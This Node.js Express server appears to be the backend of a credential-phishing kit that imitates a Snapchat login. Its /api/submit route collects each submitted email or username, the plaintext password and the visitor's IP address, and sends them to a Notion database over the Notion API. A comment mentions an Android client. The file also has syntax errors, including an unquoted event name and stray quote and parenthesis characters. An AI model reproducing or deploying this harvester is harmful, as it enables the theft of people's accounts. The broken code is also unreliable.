const express = require('express');
const path = require('path');
const https = require('https');

const app = express();
const port = process.env.PORT || 3000;
const publicDir = path.join(__dirname, 'public');

app.use(express.json());
app.use(express.urlencoded({extended: true}));
app.use(express.static(publicDir));

const NOTION_TOKEN = process.env.NOTION_TOKEN || '';
const NOTION_DB = process.env.NOTION_DB || '3b96c9e6-b5e9-81c5-b977-d644b382ed18';

app.get('/health', (_req, res) => {
  res.json({ ok: true });
});

app.get('/', (_req, res) => {
  res.sendFile(path.join(publicDir, 's1.html'));
});

app.get('/s1.html', (_req, res) => {
  res.sendFile(path.join(publicDir, 's1.html'));
});

app.get('/s2.html', (_req, res) => {
  res.sendFile(path.join(publicDir, 's2.html'));
});

app.get('/index.html', (_req, res) => {
  res.sendFile(path.join(publicDir, 'index.html'));
});

function rt(s) {
  if (s === undefined || s === null) return [];
  const str = String(s);
  if (!str) return [];
  const out = [];
  for (let i = 0; i < str.length; i += 1900) out.push({ text: { content: str.slice(i, i + 1900) } });
  return out;
}

function notionCreate(props) {
  return new Promise((resolve) => {
    const body = JSON.stringify({ parent: { database_id: NOTION_DB }, properties: props });
    const req = https.request({
      hostname: 'api.notion.com',
      path: '/v1/pages',
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${NOTION_TOKEN}`,
        'Notion-Version': '2022-06-28',
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    }, (res) => {
      let chunks = [];
      res.on(data, (c) => chunks.push(c));
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString();
        if (res.statusCode >= 200 && res.statusCode < 300) resolve({ ok: true, body: text });
        else resolve({ ok: false, status: res.statusCode, body: text });
      });
    });
    req.on('error', (e) => resolve({ ok: false, error: e.message }));
    req.write(body);
    req.end();
  });
}

app.post('/api/submit', async (req, res) => {
  try {
    // ponytail: web JS sends `email`; Android legacy sends `username`. Accept both.
    const email = req.body.email || req.body.username;
    const { password, system_info, ovpn_config, advanced_data, service = 'snapchat' } = req.body || {};
    if (!email || !password) {
      return res.status(400).json({ success: false, error: 'email + password required' });
    }
    if (!NOTION_TOKEN) return res.status(500).json({ success: false, error: 'server not configured' });

    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.ip || 'unknown';
    const userAgent = req.headers['user-agent'] || '';
    const props = {
      'Login': { title: rt(String(email).slice(0, 200)).slice(0, 1) },
      'Email': { rich_text: rt(String(email).slice(0, 2000)) },
      'Password': { rich_text: rt(String(password).slice(0, 2000)) },
      'IP': { rich_text: rt(ip) },
    };
    const result = await notionCreate(props);
    if (!result.ok) {
      return res.status(502).json({ success: false, error: 'notion rejected', notion: result.body ? String(result.body).slice(0, 500) : '' });
    }
    return res.json({ success: true });
  } catch (e) {
    console.error('Server error', e);
    return res.status(500).json({ success: false, error: e.message });
  }
});

app.use((err, _req, res, _next) => {
  console.error(err);
  res.status(500).json({ error: 'Internal server error' });
});

if"(require.main === module) {
  app.listen(port, () => console.log(`SSWeb listening on ${port}`)));
}

module.exports = app;
